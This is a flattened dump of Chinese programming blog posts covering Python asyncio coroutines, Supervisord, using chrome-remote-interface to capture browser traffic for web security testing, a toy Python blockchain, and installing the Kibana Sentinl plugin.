server.supervisor.getProcessInfo(process_name) # 获取指定进程信息print server.supervisor.startProcess(process_name) # 启动指定进程print server.supervisor.stopProcess(process_name) # 暂停指定进程 api操作比较简单，具体的方法使用文档可以参考：http://supervisord.org/api.html#xml-rpc 参考https://pypi.org/project/supervisor/https://www.jianshu.com/p/9559ab642d88http://liyangliang.me/posts/2015/06/using-supervisor/","categories":[],"tags":[{"name":"技术研究","slug":"技术研究","permalink":"http://chucz.club/tags/技术研究/"},{"name":"Supervisord","slug":"Supervisord","permalink":"http://chucz.club/tags/Supervisord/"}]},{"title":"Python3.5协程学习研究","slug":"Python3-5协程学习研究","date":"2018-06-20T23:18:04.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/06/20/Python3-5协程学习研究/","link":"","permalink":"http://chucz.club/2018/06/20/Python3-5协程学习研究/","excerpt":"","text":"今夕何夕故人不来迟暮连山黛 之前有研究过python协程相关的知识，但一直没有进行深入探究。平常工作中使用的也还是以python2为主，然而最近的项目需要使用python3协程相关的内容，因此凑出时间学习了一番python3的协程语法。 本篇主要以介绍python3.5的async/await协程语法为主，因为这种语法看上去很别扭，不容易理解。如果对python协程基础不是很了解，建议可以先看此篇：Python协程。 协程函数（异步函数） 我们平常使用最多的函数都是同步函数，即不同函数执行是按顺序执行的。那么什么是异步函数呢？怎么创建异步函数？怎么在异步函数之间来回切换执行？不急，请往下看。 创建协程函数先来看下普通函数： 123456789101112def test1(): print(“1”) print(“2”)def test2(): print(“3”) print(“4”)a = test1()b = test2()print(a,type(a))print(b,type(b)) 运行以上代码得到结果： 1234561234None &lt;class ‘NoneType’&gt;None &lt;class ‘NoneType’&gt; 说明：程序顺序执行了test1、test2函数，在调用函数的时候就自动进入了函数体，并执行了函数的内容。 然后使用async关键词将普通函数变成协程函数，即异步函数： 12345678910async def test1(): print(“1”) print(“2”)async def test2(): print(“3”) print(“4”)print(test1())print(test2()) 运行以上代码得到结果： 123456&lt;coroutine object test1 at 0x109f4c620&gt;asyncio_python3_test.py:16: RuntimeWarning: coroutine ‘test1’ was never awaited print(test1())&lt;coroutine object test2 at 0x109f4c620&gt;asyncio_python3_test.py:17: RuntimeWarning: coroutine ‘test2’ was never awaited print(test2()) 说明：忽略结果中的告警，可以看到调用函数test1、test2的时候，并没有进入函数体且执行函数内容，而是返回了一个coroutine（协程对象）。 除了函数外，类的方法也可以使用async关键词将其变成协程方法： 123class test: async def run(self): print(“1”) 执行协程函数 前面我们成功创建了协程函数，并且在调用函数的时候返回了一个协程对象，那么怎么进入函数体并执行函数内容呢？类似于生成器，可以使用send方法执行函数，修改下前面的代码： 12345678910111213async def test1(): print(“1”) print(“2”)async def test2(): print(“3”) print(“4”)a = test1()b = test2()a.send(None)b.send(None) 运行以上代码得到以下结果： 123456712Traceback (most recent call last): File “asyncio_python3_test.py”, line 19, in &lt;module&gt; a.send(None)StopIterationsys:1: RuntimeWarning: coroutine ‘test2’ was never awaited 说明：程序先执行了test1协程函数，当test1执行完时报了StopIteration异常，这是协程函数执行完饭回的一个异常，我们可以用try except捕捉，来用判断协程函数是否执行完毕。 1234567891011121314151617181920212223async def test1(): print(“1”) print(“2”)async def test2(): print(“3”) print(“4”)a = test1()b = test2()try: a.send(None) # 可以通过调用 send 方法，执行协程函数except StopIteration as e: print(e.value) # 协程函数执行结束时会抛出一个StopIteration 异常，标志着协程函数执行结束，返回值在value中 passtry: b.send(None) # 可以通过调用 send 方法，执行协程函数except StopIteration: print(e.value) # 协程函数执行结束时会抛出一个StopIteration 异常，标志着协程函数执行结束，返回值在value中 pass 运行以上代码得到以下结果： 12341234 说明：程序先执行了test1函数，等到test1函数执行完后再执行test2函数。从执行过程上来看目前协程函数与普通函数没有区别，并没有实现异步函数，那么如何交叉运行协程函数呢？ 交叉执行协程函数（await） 通过以上例子，我们发现定义协程函数可以使用async关键词，执行函数可以使用send方法，那么如何实现在两个协程函数间来回切换执行呢？这里需要使用await关键词，修改一下代码： 123456789101112131415161718192021222324import asyncioasync def test1(): print(“1”) await asyncio.sleep(1) # asyncio.sleep(1)返回的也是一个协程对象 print(“2”)async def test2(): print(“3”) print(“4”)a = test1()b = test2()try: a.send(None) # 可以通过调用 send 方法，执行协程函数except StopIteration: # 协程函数执行结束时会抛出一个StopIteration 异常，标志着协程函数执行结束 passtry: b.send(None) # 可以通过调用 send 方法，执行协程函数except StopIteration: pas 运行以上函数得到以下结果： 123134 说明：程序先执行test1协程函数，在执行到await时，test1函数停止了执行（阻塞）；接着开始执行test2协程函数，直到test2执行完毕。从结果中，我们可以看到，直到程序运行完毕，test1函数也没有执行完（没有执行print(“2”)），那么如何使test1函数执行完毕呢？可以使用asyncio自带的方法循环执行协程函数。 await与阻塞 使用async可以定义协程对象，使用await可以针对耗时的操作进行挂起，就像生成器里的yield一样，函数让出控制权。协程遇到await，事件循环将会挂起该协程，执行别的协程，直到其他的协程也挂起或者执行完毕，再进行下一个协程的执行，协程的目的也是让一些耗时的操作异步化。 注意点：await后面跟的必须是一个Awaitable对象，或者实现了相应协议的对象，查看Awaitable抽象类的代码，表明了只要一个类实现了await方法，那么通过它构造出来的实例就是一个Awaitable，并且Coroutine类也继承了Awaitable。 自动循环执行协程函数 通过前面介绍我们知道执行协程函数需要使用send方法，但一旦协程函数执行过程中切换到其他函数了，那么这个函数就不在被继续运行了，并且使用sned方法不是很高效。那么如何在执行整个程序过程中，自动得执行所有的协程函数呢，就如同多线程、多进程那样，隐式得执行而不是显示的通过send方法去执行函数。 事件循环方法前面提到的问题就需要用到事件循环方法去解决，即asyncio.get_event_loop方法，修改以上代码如下： 12345678910111213import asyncioasync def test1(): print(“1”) await test2() print(“2”)async def test2(): print(“3”) print(“4”)loop = asyncio.get_event_loop()loop.run_until_complete(test1()) 运行以上代码得到以下结果： 12341342 说明：asyncio.get_event_loop方法可以创建一个事件循环，然后使用run_until_complete将协程注册到事件循环，并启动事件循环。 task任务 由于协程对象不能直接运行，在注册事件循环的时候，其实是run_until_complete方法将协程包装成为了一个任务（task）对象。所谓task对象是Future类的子类，保存了协程运行后的状态，用于未来获取协程的结果。我们也可以手动将协程对象定义成task，修改以上代码如下： 1234567891011121314import asyncioasync def test1(): print(“1”) await test2() print(“2”)async def test2(): print(“3”) print(“4”)loop = asyncio.get_event_loop()task = loop.create_task(test1())loop.run_until_complete(task) 说明：前面说到task对象保存了协程运行的状态，并且可以获取协程函数运行的返回值，那么具体该如何获取呢？这里可以分两种方式，一种需要绑定回调函数，另外一种则直接在运行完task任务后输出。值得一提的是，如果使用send方法执行函数，则返回值可以通过捕捉StopIteration异常，利用StopIteration.value获取。 直接输出task结果当协程函数运行结束后，我们需要得到其返回值，第一种方式就是等到task状态为finish时，调用task的result方法获取返回值。 12345678910111213141516import asyncioasync def test1(): print(“1”) await test2() print(“2”) return “stop”async def test2(): print(“3”) print(“4”)loop = asyncio.get_event_loop()task = asyncio.ensure_future(test1())loop.run_until_complete(task)print(task.result()) 运行以上代码得到以下结果： 123451342stop 回调函数 获取返回值的第二种方法是可以通过绑定回调函数，在task执行完毕的时候可以获取执行的结果，回调的最后一个参数是future对象，通过该对象可以获取协程返回值。 12345678910111213141516171819import asyncioasync def test1(): print(“1”) await test2() print(“2”) return “stop”async def test2(): print(“3”) print(“4”)def callback(future): print(‘Callback:’,future.result()) # 通过future对象的result方法可以获取协程函数的返回值loop = asyncio.get_event_loop()task = asyncio.ensure_future(test1()) # 创建task，test1()是一个协程对象task.add_done_callback(callback) # 绑定回调函数loop.run_until_complete(task) 运行以上代码得到以下结果： 123451342Callback: stop 如果回调函数需要接受多个参数，可以通过偏函数导入，修改代码如下： 123456789101112131415161718192021import asyncioimport functoolsasync def test1(): print(“1”) await test2() print(“2”) return “stop”async def test2(): print(“3”) print(“4”)def callback(param1,param2,future): print(param1,param2) print(‘Callback:’,future.result())loop = asyncio.get_event_loop()task = asyncio.ensure_future(test1())task.add_done_callback(functools.partial(callback,“param1”,“param2”))loop.run_until_complete(task) 说明：回调函数中的future对象就是创建的task对象。 future对象 future对象有几个状态：Pending、Running、Done、Cancelled。创建future的时候，task为pending，事件循环调用执行的时候当然就是running，调用完毕自然就是done，如果需要停止事件循环，就需要先把task取消，可以使用asyncio.Task获取事件循环的task。 协程停止 前面介绍了使用事件循环执行协程函数，那么怎么停止执行呢？在停止执行协程前，需要先取消task，然后再停止loop事件循环。 123456789101112131415161718192021222324import asyncioasync def test1(): print(“1”) await asyncio.sleep(3) print(“2”) return “stop”tasks = [ asyncio.ensure_future(test1()), asyncio.ensure_future(test1()), asyncio.ensure_future(test1()),]loop = asyncio.get_event_loop()try: loop.run_until_complete(asyncio.wait(tasks))except KeyboardInterrupt as e: for task in asyncio.Task.all_tasks(): task.cancel() loop.stop() loop.run_forever()finally: loop.close() 运行以上代码，按ctrl+c可以结束执行。 本文中用到的一些概念及方法 event_loop事件循环：程序开启一个无限的循环，当把一些函数注册到事件循环上时，满足事件发生条件即调用相应的函数。 coroutine协程对象：指一个使用async关键字定义的函数，它的调用不会立即执行函数，而是会返回一个协程对象，协程对象需要注册到事件循环，由事件循环调用。 task任务：一个协程对象就是一个原生可以挂起的函数，任务则是对协程进一步封装，其中包含任务的各种状态。 future：代表将来执行或没有执行的任务的结果，它和task上没有本质的区别 async/await关键字：python3.5用于定义协程的关键字，async定义一个协程，await用于挂起阻塞的异步调用接口。 并发与并行 并发通常指有多个任务需要同时进行，并行则是同一时刻有多个任务执行。用多线程、多进程、协程来说，协程实现并发，多线程与多进程实现并行。 asyncio协程如何实现并发 asyncio想要实现并发，就需要多个协程来完成任务，每当有任务阻塞的时候就await，然后其他协程继续工作，这需要创建多个协程的列表，然后将这些协程注册到事件循环中。这里指的多个协程，可以是多个协程函数，也可以是一个协程函数的多个协程对象。 1234567891011121314151617181920212223import asyncioasync def test1(): print(“1”) await asyncio.sleep(1) print(“2”) return “stop”a = test1()b = test1()c = test1()tasks = [ asyncio.ensure_future(a), asyncio.ensure_future(b), asyncio.ensure_future(c),]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) # 注意asyncio.wait方法for task in tasks: print(“task result is “,task.result()) 运行以上代码得到以下结果： 123456789111222task result is stoptask result is stoptask result is stop 说明：代码先是定义了三个协程对象，然后通过asyncio.ensure_future方法创建了三个task，并且将所有的task加入到了task列表，最终使用loop.run_until_complete将task列表添加到事件循环中。 协程爬虫 前面介绍了如何使用async与await创建协程函数，使用asyncio.get_event_loop创建事件循环并执行协程函数。例子很好地展示了协程并发的高效，但在实际应用场景中该如何开发协程程序？比如说异步爬虫。我尝试用requests模块、urllib模块写异步爬虫，但实际操作发现并不支持asyncio异步，因此可以使用aiohttp模块编写异步爬虫。 aiohttp实现1234567891011121314import asyncioimport aiohttpasync def run(url): print(“start spider “,url) async with aiohttp.ClientSession() as session: async with session.get(url) as resp: print(resp.url)url_list = [“https://thief.one&quot;,“https://home.nmask.cn&quot;,“https://movie.nmask.cn&quot;,“https://tool.nmask.cn&quot;]tasks = [asyncio.ensure_future(run(url)) for url in url_list]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) 运行以上代码得到以下结果： 12345678start spider https://thief.onestart spider https://home.nmask.cnstart spider https://movie.nmask.cnstart spider https://tool.nmask.cnhttps://movie.nmask.cnhttps://home.nmask.cnhttps://tool.nmask.cnhttps://thief.one 说明：aiohttp基于asyncio实现，既可以用来写webserver，也可以当爬虫使用。 requests实现 由于requests模块阻塞了客户代码与asycio事件循环的唯一线程，因此在执行调用时，整个应用程序都会冻结，但如果一定要用requests模块，可以使用事件循环对象的run_in_executor方法，通过run_in_executor方法来新建一个线程来执行耗时函数，因此可以这样修改代码实现： 1234567891011121314import asyncioimport requestsasync def run(url): print(“start “,url) loop = asyncio.get_event_loop() response = await loop.run_in_executor(None, requests.get, url) print(response.url) url_list = [“https://thief.one&quot;,“https://home.nmask.cn&quot;,“https://movie.nmask.cn&quot;,“https://tool.nmask.cn&quot;]tasks = [asyncio.ensure_future(run(url)) for url in url_list]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) 如果要给requests带上参数，可以使用functools： 12345678910111213141516171819import asyncioimport requestsimport functoolsasync def run(url): print(“start “,url) loop = asyncio.get_event_loop() try: response = await loop.run_in_executor(None,functools.partial(requests.get,url=url,params=“”,timeout=1)) except Exception as e: print(e) else: print(response.url)url_list = [“https://thief.one&quot;,“https://home.nmask.cn&quot;,“https://movie.nmask.cn&quot;,“https://tool.nmask.cn&quot;]tasks = [asyncio.ensure_future(run(url)) for url in url_list]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) asyncio中使用阻塞函数 如同前面介绍如何在asyncio中使用requests模块一样，如果想在asyncio中使用其他阻塞函数，该怎么实现呢？虽然目前有异步函数支持asyncio，但实际问题是大部分IO模块还不支持asyncio。 阻塞函数在asyncio中使用的问题 阻塞函数(例如io读写，requests网络请求)阻塞了客户代码与asycio事件循环的唯一线程，因此在执行调用时，整个应用程序都会冻结。 解决方案 这个问题的解决方法是使用事件循环对象的run_in_executor方法。asyncio的事件循环在背后维护着一个ThreadPoolExecutor对象，我们可以调用run_in_executor方法，把可调用对象发给它执行，即可以通过run_in_executor方法来新建一个线程来执行耗时函数。 run_in_executor方法1AbstractEventLoop.run_in_executor(executor, func, *args) executor 参数应该是一个 Executor 实例。如果为 None，则使用默认 executor。 func 就是要执行的函数 args 就是传递给 func 的参数 实际例子（使用time.sleep()）： 1234567891011121314151617import asyncioimport timeasync def run(url): print(“start “,url) loop = asyncio.get_event_loop() try: await loop.run_in_executor(None,time.sleep,1) except Exception as e: print(e) print(“stop “,url)url_list = [“https://thief.one&quot;,“https://home.nmask.cn&quot;,“https://movie.nmask.cn&quot;,“https://tool.nmask.cn&quot;]tasks = [asyncio.ensure_future(run(url)) for url in url_list]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) 运行以上代码得到以下函数： 12345678start https://thief.onestart https://home.nmask.cnstart https://movie.nmask.cnstart https://tool.nmask.cnstop https://thief.onestop https://movie.nmask.cnstop https://home.nmask.cnstop https://tool.nmask.cn 说明：有了run_in_executor方法，我们就可以使用之前熟悉的模块创建协程并发了，而不需要使用特定的模块进行IO异步开发。 参考https://www.oschina.net/translate/playing-around-with-await-async-in-python-3-5https://www.jianshu.com/p/b5e347b3a17chttps://zhuanlan.zhihu.com/p/27258289https://juejin.im/entry/5aabb949f265da23a04951df","categories":[],"tags":[{"name":"编程之道","slug":"编程之道","permalink":"http://chucz.club/tags/编程之道/"},{"name":"python","slug":"python","permalink":"http://chucz.club/tags/python/"},{"name":"协程","slug":"协程","permalink":"http://chucz.club/tags/协程/"}]},{"title":"利用chrome_remote_interface实现程序化、自动化Web安全测试","slug":"利用chrome-remote-interface实现程序化、自动化Web安全测试","date":"2018-06-07T01:00:27.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/06/07/利用chrome-remote-interface实现程序化、自动化Web安全测试/","link":"","permalink":"http://chucz.club/2018/06/07/利用chrome-remote-interface实现程序化、自动化Web安全测试/","excerpt":"","text":"高考加油！ 如果要问有哪些抓包神器或者流量分析工具？以下几款工具是必须要提的，burpsuite（跨平台）、fiddler（windows下抓包神器）、wireshark（经典网络抓包工具）、justniffer（与前面几个使用代理获取流量不一样的是，justniffer是基于网卡获取流量）等。以上这几款工具之前我有单独成文介绍过，如有需要可点击蓝色链接移步。 那么如果问有哪些程序化的抓包工具？（注明一下这里的程序化指的是可编程）首先burpsuite算一个，因为我们可以开发扩展工具（burpsuite插件开发之检测越权访问漏洞）；另外fiddle也算一个，可以编辑配置文件，达到扩展功能，之前也介绍过。 那么如果问有哪些即可以实现程序化又可以实现自动化的抓包工具？（注明一下这里的自动化是指自动产生流量）这个问题有点拗口，你可能会想为什么一个抓包工具要负责产生流量，流量交给爬虫岂不是更好？这个问题暂且放一放，继续往下看。 自动化安全测试 平常我们经常会使用burpsuite等工具检测一个网站的安全性，检测方法不外乎使用浏览器访问网站且把流量代理到burpsuite上，然后在burpsuite上通过拦截、修改、重放流量等方式测试网站安全性。然而当要测试的网站非常多时，有没有一个更自动化、更省力的方式去测试呢？方案肯定是有的，简单来说要实现自动化web安全测试无非要解决几个问题，首先是流量怎么产生？然后是怎么从流量中分析出漏洞？ 自动化测试方案：主动扫描器 市面上基于爬虫的主动扫描器就是一种自动化安全测试工具，首先它的流量是通过爬虫爬取url主动产生的，然后利用一些漏洞插件去构造不同的访问请求。短板：目前市面上扫描器爬虫大多基于web1.0，无法加载js渲染网页，而现在越来越多的网站使用web2.0技术实现前后端数据交互。 自动化测试方案：被动扫描器 一些大厂内部自研的被动扫描器，首先它的流量不是通过爬虫主动获取的，而是通过监听交换机等网络设备的网卡流量，然后利用一些漏洞插件去分析流量中存在漏洞的点。短板：适合大厂各业务线安全检查不适合测试某个特定的网站，因为需要人为访问网站产生流量。 自动化测试方案：selenium+流量获取工具+漏洞插件 selenium是一款网站自动化测试工具，可以程序化的操作浏览器，实现自动化产生流量。再结合抓包工具以及漏洞检测插件，应该就可以解决流量获取以及漏洞检测的问题。短板：用selenium只能实现一些简单的浏览器操作，对于检测复杂的网站系统，似乎不够用，而且速度很慢，性能很差。 自动化测试方案：chrome_remote_interface+漏洞插件 之前我介绍过headless chrome，也介绍过phantomjs等web2.0爬虫工具，目前推荐去学习使用headless-chrome。headless chrome工具是用来自动加载js，获取渲染后的页面源码，解决web2.0爬虫之困。而chrome_remote_interface是一个更底层的工具，可以用来分析协议，简单说就是可以分析整个渲染过程，以及截取分析过程中的流量。就类似您打开了chrome浏览器的审查元素功能，然后刷新一下页面，查看一下network信息。 chrome_remote_interface介绍chrome_remote_interface是一个开源项目，项目地址，并且支持命令行、编码两种方式，且使用node.js开发。 安装使用因为chrome_remote_interface是基于nodejs的，因此需要安装npm包管理工具。 1yum install npm -y 然后创建一个目录，初始化一个项目 1npm init 在目录下安装chrome_remote_interface 1npm install chrome-remote-interface 创建一个简单的nodejs程序(nmask.js)： 1234567891011121314151617181920212223242526272829303132const CDP = require(‘chrome-remote-interface’);// node nmask.js https://nmask.cnvar options = process.argv;var target_url = options[2];CDP((client) =&gt; &#123; // extract domains const &#123;Network, Page&#125; = client; // setup handlers Network.requestWillBeSent((params) =&gt; &#123; console.log(params.request.url); &#125;); Page.loadEventFired(() =&gt; &#123; client.close(); &#125;); // enable events then start! Promise.all([ Network.enable(), Page.enable() ]).then(() =&gt; &#123; return Page.navigate(&#123;url: target_url&#125;);//输出请求的url &#125;).catch((err) =&gt; &#123; console.error(err); client.close(); &#125;);&#125;).on(‘error’, (err) =&gt; &#123; console.error(err);&#125;); 说明：在运行这段程序前，必须要在系统上安装chrome以及启动chrome headless监听模式，具体怎么安装chrome headless可以移步：headless chrome and api启动chrome headless监听模式： 123chrome –headless –remote-debugging-port=9222或者google-chrome –headless –remote-debugging-port=9222 然后另外开启一个窗口，运行nodejs： 1node nmask.js https://thief.one 运行结果如下：(输出渲染过程中请求的所有url) chrome_remote_interface for python 由于chrome_remote_interface是nodejs实现的，因此对于不熟悉nodejs的朋友来说coding成本比较高。然而好在已经有外国友人用python封装了一个工具，项目地址，虽然目前此项目尚处于初级阶段，但实实在在地解决了我的问题。 安装使用基于是用python3.5开发的，那么就clone一下项目，直接安装吧： 12git clone https://github.com/wasiher/chrome-remote-interface-python.gitpython3 setup.py install 编写一个python版的程序(nmask.py)： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#! -- coding:utf-8 --‘’‘author=”nMask”Date=”7 Jun 2018”Blog=”https://thief.one&quot;version=”1.0”py_version=”3.5”‘‘’import asyncioimport chrome_remote_interfaceclass callbacks(object): ‘’‘ callback class ‘‘’ target_url = ‘’ result = [] async def start(tabs): await tabs.add() async def tab_start(tabs, tab): await tab.Page.enable() await tab.Network.enable() await tab.Page.navigate(url=callbacks.target_url) async def network__response_received(tabs, tab, requestId, loaderId, timestamp, type, response, kwargs): ‘’‘ print(response.requestHeaders) print(dir(response)) more response attribute https://chromedevtools.github.io/devtools-protocol/tot/Network#type-Response ‘‘’ try: body = tabs.helpers.old_helpers.unpack_response_body(await tab.Network.get_response_body(requestId=requestId)) except tabs.FailResponse as e: print(‘[Error]’, e) else: print(response.url,response.status,len(body)) callbacks.result.append((response.url,response.status,len(body))) async def page__frame_stopped_loading(tabs, tab, kwargs): print(“[Info]Finish”) tabs.terminate() async def any(tabs, tab, callback_name, parameters): passif name==“main“: callbacks.target_url = “http://www.baidu.com&quot; asyncio.get_event_loop().run_until_complete(chrome_remote_interface.Tabs.run(‘localhost’, 9222, callbacks)) print(callbacks.result) 说明：同样的在运行这段代码前，先运行chrome headless监听程序。 然后运行该程序： 1python nmask.py 说明：运行程序，最终得到渲染过程中请求的url、响应码、响应内容长度。 Chrome Debugging Protocol 无论是nodejs版本的chrome-remote-interface还是python版本的，实现的底层都是基于Chrome Debugging Protocol接口，官方文档，因此在使用chrome-remote-interface过程中，可以查询一下这个文档。比如python版本中network__response_received函数，是封装了Chrome Debugging Protocol接口Network.ResponseReceived函数，而此函数接受的参数，以及一些属性方法等都可以在该文档中查询。 解决文章开头的问题 文章开头还留了一个问题，有哪些即可以实现程序化又可以实现自动化的抓包工具？想想chrome-remote-interface能干啥？其一可以使用nodejs、python（可能还有其他语言封装的项目）编程，底层接口文档比较完善；其二用它来写web2.0爬虫，访问页面产生流量，当然区别web1.0爬虫，这里的流量是完整的流量，相当于人工打开浏览器访问网页；其三可以获取流量，并且进行分析。第一点功能实现了程序化，第二三点功能实现了自动化。 最后让我们回过头看一下前文提到的自动化测试方案–主动扫描器，其短板就是没法解决web2.0爬虫的困境，而chrome-remote-interface恰恰可以解决，发挥下想象力，其前途应该无限！","categories":[],"tags":[{"name":"爬虫技术","slug":"爬虫技术","permalink":"http://chucz.club/tags/爬虫技术/"},{"name":"chrome_remote_interface","slug":"chrome-remote-interface","permalink":"http://chucz.club/tags/chrome-remote-interface/"},{"name":"headless chrome","slug":"headless-chrome","permalink":"http://chucz.club/tags/headless-chrome/"}]},{"title":"区块链系列·python实现的区块链","slug":"区块链系列·python实现的区块链","date":"2018-05-25T00:16:48.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/05/25/区块链系列·python实现的区块链/","link":"","permalink":"http://chucz.club/2018/05/25/区块链系列·python实现的区块链/","excerpt":"","text":"地是床 天是被 流星是眼泪有时醒 有时醉 大雁飞一个来回 听说现在会点区块链技术的工资都高破天了，抱着对高工资的幻想，我决定也开始学一学区块链吧。那么我想接触区块链的第一步必须得是去交易平台注册个帐号，然后充点钱买0.00001个BTC了。（2333，~!~现在我穷得只剩下币了） 老实说区块链技术还是有点难理解的，为此我搜了搜区块链的实现代码，想着结合代码看获许会简单一点，于是我发现有人用python实现了简单的区块链，于是再原作者基础上，我稍微修改了点内容，在此粘贴一下，以供学习。原项目地址：https://github.com/xilibi2003/blockchain 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239#! -- coding:utf-8 --import hashlibimport jsonfrom time import timeclass Blockchain(object): ‘’‘ 区块链 一个区块结构（每个区块的字典顺序必须一致）： block = &#123; ‘index‘: 1, # 区块索引 ‘timestamp‘: 1506057125.900785, # 时间戳 ‘transactions‘: [ # 交易列表 &#123; ‘sender‘: “8527147fe1f5426f9dd545de4b27ee00”, ‘recipient‘: “a77f5cdfa2934df3954a5c7c7da5df1f”, ‘amount‘: 5, &#125; ], ‘proof‘: 324984774000, # 工作量证明 ‘previous_hash‘: “2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824” &#125; ‘‘’ def init(self): self.chain = [] # 区块列表 self.current_transactions = [] # 交易列表 self.nodes = set() # 节点列表(避免重复) self.new_block(previous_hash=1, proof=100) # 创造创世区块 def register_node(self,address): ‘’‘ 注册节点 Add a new node to the list of nodes :param address: &lt;str&gt; 节点地址 ‘192.168.0.1:5000‘ :return: None ‘‘’ self.nodes.add(address) def valid_chain(self,chain): ‘’‘ 验证区块链的有效性 :param chain: &lt;list&gt; 一个完整的区块链 :return: &lt;bool&gt; True if valid, False if not ‘‘’ previous_block = chain[0] # 前一个区块 current_index = 1 # 当前区块索引 while current_index &lt; len(chain): block = chain[current_index] # 当前区块 if block[‘previous_hash’] != self.hash(previous_block): ‘’‘ hash值验证 ‘‘’ return False if not self.valid_proof(previous_block[‘proof’],block[‘proof’]): ‘’‘ 工作量证明验证 ‘‘’ return False previous_block = block current_index += 1 return True def resolve_conflicts(self): ‘’‘ 共识算法解决不同节点账本不相同的冲突 使用网络中最长的有效区块链 :return: &lt;bool&gt; True 如果链被取代, 否则为False ‘‘’ neighbours = self.nodes # 网络中所有节点列表 new_chain = None max_length = len(self.chain) # 当前节点的区块链长度 for node in neighbours: # 遍历所有网络节点，若有比本节点有效区块链长的，则替换掉本地区块链 # 通过api获取 length = 100 # 某节点区块链长度 chain = [] # 某节点区块链列表 if length &gt; max_length and self.valid_chain(chain): max_length = length new_chain = chain if new_chain: self.chain = new_chain return True return False def new_block(self,proof,previous_hash=None): ‘’‘ 创建新的区块，添加到区块链中 生成新块 :param proof: &lt;int&gt; 工作量证明 :param previous_hash: 前一个区块的hash值 :return: &lt;dict&gt; 新区块 ‘‘’ block = &#123; ‘index’: len(self.chain) + 1, # 确保索引在区块链尾部 ‘timestamp’: time(), ‘transactions’: self.current_transactions, # 交易列表 ‘proof’: proof, # 工作量证明 ‘previous_hash’: previous_hash or self.hash(self.chain[-1]), # 此区块前一个区块的hash &#125; # 对交易的详细内容可以进行操作，比如说增加金币，或者减少金币等等。 self.current_transactions = [] # 重置交易列表 self.chain.append(block) # 将新的区块添加到区块链中 return block def new_transactions(self,sender,recipient,amount): ‘’‘ 添加新的交易到交易列表中 生成新交易信息，信息将加入到下一个待挖的区块中 :param sender: &lt;str&gt; 发送者地址 :param recipient: &lt;str&gt; 接收着地址 :param amount: &lt;int&gt; 金额或者数量 :return: &lt;int&gt; 返回这笔交易的区块链索引（将这笔交易添加到区块链最后面） ‘‘’ self.current_transactions.append(&#123; “sender”:sender, ‘recipient’:recipient, ‘amount’:amount, &#125;) return self.last_block[‘index’] + 1 @staticmethod def hash(block): ‘’‘ 计算一个区块的hash值 生成块的 SHA-256 hash值 :param block: &lt;dict&gt; Block :return: &lt;str&gt; ‘‘’ block_string = json.dumps(block, sort_keys=True).encode() return hashlib.sha256(block_string).hexdigest() @property def last_block(self): ‘’‘ 区块链中最后一个区块 ‘‘’ return self.chain[-1] # 返回区块链中最后一个区块 def proof_of_work(self, last_proof): ‘’‘ 简单的工作量证明: - 查找一个 p’ 使得 hash(pp‘) 以4个0开头 - p 是上一个块的证明, p’ 是当前的证明 :param last_proof: &lt;int&gt; :return: &lt;int&gt; ‘’‘ proof = 0 while self.valid_proof(last_proof, proof) is False: proof += 1 return proof @staticmethod def valid_proof(last_proof,proof): ‘‘’ 验证证明: 是否hash(last_proof, proof)以4个0开头? :param last_proof: &lt;int&gt; 前一个区块的hash :param proof: &lt;int&gt; 当前区块的hash :return: &lt;bool&gt; True or False ‘’‘ guess = (str(last_proof)+str(proof)).encode() guess_hash = hashlib.sha256(guess).hexdigest() return guess_hash[:4] == “0000”if name==”main“: # 运行这一段脚本就是一个区块链节点，而节点之间可以通过api的方式互相传递信息 # 每个节点都每隔10分钟运行一次 blockchain = Blockchain() for i in range(2): # 同步一下区块 # 开始挖矿 last_block = blockchain.last_block last_proof = last_block[‘proof‘] proof = blockchain.proof_of_work(last_proof) # 挖矿成功后，生成新的交易（奖励交易） blockchain.new_transactions(sender=”0”,recipient=”000002”,amount=1) # 添加新的交易(不是奖励交易，而是普通交易) blockchain.new_transactions(sender=”0000001”,recipient=”000002”,amount=1) # 输出当前交易列表 print “current_transactions lists is: \\n”,blockchain.current_transactions # 挖矿成功后，生成新的区块（包含奖励交易信息、新增的交易信息），只有挖矿成功后，才能创造出新的区块。 block = blockchain.new_block(proof) # 输出当前区块链 print “current chain lists is: \\n”,blockchain.chain 从本篇开始，我将继续学习一些区块链的技术以及区块链安全相关的技术，并会总结成系列文章在博客发布，技术有限请多包涵！","categories":[],"tags":[{"name":"区块链安全","slug":"区块链安全","permalink":"http://chucz.club/tags/区块链安全/"},{"name":"区块链","slug":"区块链","permalink":"http://chucz.club/tags/区块链/"}]},{"title":"ELK Sentinl","slug":"ELK-Sentinl","date":"2018-05-20T18:14:12.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/05/20/ELK-Sentinl/","link":"","permalink":"http://chucz.club/2018/05/20/ELK-Sentinl/","excerpt":"","text":"Sentinl简介Sentinl 5扩展自Kibi / Kibana 5，具有警报和报告功能，可使用标准查询，可编程验证器和各种可配置操作来监控，通知和报告数据系列更改 - 将其视为一个独立的“观察者” “报告”功能（PNG / PDFs快照）。 SENTINEL还旨在通过直接在Kibana UI中整合来简化在Kibi / Kibana中创建和管理警报和报告的过程。 功能模块WatchersAlarmsReportsWatchers是Sentinl核心，主要由 input,Condition,Transform,Actions几大块组成，可以和X-Pack一一对应，部分文档可参考X-Pack，但需要注意的是它和X-Pack还有一些区别，主要体现在input只实现了search，其他并未实现，Actions也并未都实现 安装与配置 安装 /usr/share/kibana/bin/kibana-plugin install https://github.com/sirensolutions/sentinl/releases/download/tag-5.5/sentinl-v5.6.5.zip config kibana.yml config: 